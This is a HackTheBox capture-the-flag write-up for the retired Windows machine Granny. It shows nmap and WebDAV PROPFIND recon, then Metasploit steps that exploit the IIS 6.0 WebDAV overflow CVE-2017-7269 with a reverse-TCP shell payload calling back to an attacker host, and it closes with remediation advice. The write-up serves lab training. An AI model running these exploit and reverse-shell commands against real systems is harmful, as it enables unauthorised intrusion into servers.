HTB Granny: the same WebDAV bug, retargeted and re-owned

retired-machineeasy

Granny is a retired HackTheBox easy Windows machine and Grandpa’s deliberate twin. Synopsis: another IIS 6.0 on Server 2003, another CVE-2017-7269 path — but stock Grandpa settings fail here. The lesson: reading and retargeting exploit code.

$ Enumeration — same banner, verify WebDAV

# bash: confirm the DAV surface
nmap -sC -sV -oN granny.nmap 10.10.10.15
curl -s -X PROPFIND http://10.10.10.15/ -H "Depth: 0" | head -20

Same recon (IIS 6.0 banner, WebDAV enabled), same module — but the default target crashes the service instead of returning a shell.

$ Exploitation — retarget the module

# msfconsole: retarget plus smaller payload
msfconsole -q
msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf6 exploit(iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.15
msf6 exploit(iis_webdav_scstoragepathfromurl) > show targets
msf6 exploit(iis_webdav_scstoragepathfromurl) > set TARGET <matching 2003 profile>
msf6 exploit(iis_webdav_scstoragepathfromurl) > set PAYLOAD windows/shell/reverse_tcp
msf6 exploit(iis_webdav_scstoragepathfromurl) > set LHOST 10.10.14.23
msf6 exploit(iis_webdav_scstoragepathfromurl) > run

Select the matching target profile and switch to a payload that fits the overflow constraints — the same overflow then lands cleanly as SYSTEM. Flags fall in the single session. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Re-running identical Grandpa settings hoping for luck (exploits are deterministic — change a variable, do not pray) and blaming the VPN (verify with a manual PROPFIND probe that WebDAV actually responds first).

$ Remediation notes

Retire the stack. One patch gap, two boxes, same root cause — asset inventory catches both at once. Written by Lucky Thandel.
